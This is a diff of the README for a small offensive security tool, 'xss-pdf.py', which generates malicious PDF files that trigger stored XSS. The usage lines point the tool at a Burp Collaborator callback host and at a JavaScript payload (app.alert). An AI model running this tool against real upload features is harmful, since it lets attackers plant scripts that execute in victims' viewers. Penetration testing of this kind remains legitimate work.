@@ -2,22 +2,22 @@
 
 Installation
 ```
-git clone URL
+git clone https://github.com/kaanatmacaa/pdf-injection.git
 ```
 
 Usage
 ```
 python -h
 python3 xss-pdf.py 
-python3 xss-pdf.py -o 1 -u http://n1pze4owqnry5tzzqngb5.oastify.com
+python3 xss-pdf.py -o 1 -u http://burpsuite12345.oastify.com
 python3 xss-pdf.py -o 2 -sc app.alert(2) 
 ```
 
 Option 1
-creates malicous PDF files for stored xss vulnerability
+Creates three malicous PDF files leading to stored XSS
 
 Option 2
-allows user to create own PDF file with their personal scripts - still working on it
+  Allows user to create own PDF file with their personal scripts - still working on it
 
 
 Open to new suggestions, please create an issue
